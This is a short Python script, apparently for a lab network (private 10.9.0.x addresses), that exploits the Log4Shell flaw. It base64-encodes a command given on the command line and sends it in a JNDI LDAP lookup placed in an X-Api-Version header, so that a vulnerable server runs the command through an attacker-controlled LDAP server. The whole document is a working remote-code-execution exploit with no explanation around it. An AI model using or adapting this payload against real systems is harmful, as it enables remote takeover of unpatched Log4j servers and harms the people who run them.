#!/usr/bin/python3

import os
import sys
import base64
import requests
import urllib.parse

ldap = '10.9.0.5:1389'
server_ip = '10.9.0.6:8080'

try:
	cmd = sys.argv[1]
	data = base64.b64encode(cmd.encode('utf-8')).decode('utf-8')
	data = data.replace('+', '%2B')
	print(data)
	os.system('curl ' + server_ip + f" -H 'X-Api-Version: ${{jndi:ldap://{ldap}/Basic/Command/Base64/{data}}}'")
	os.system('echo')
except KeyboardInterrupt:
	exit()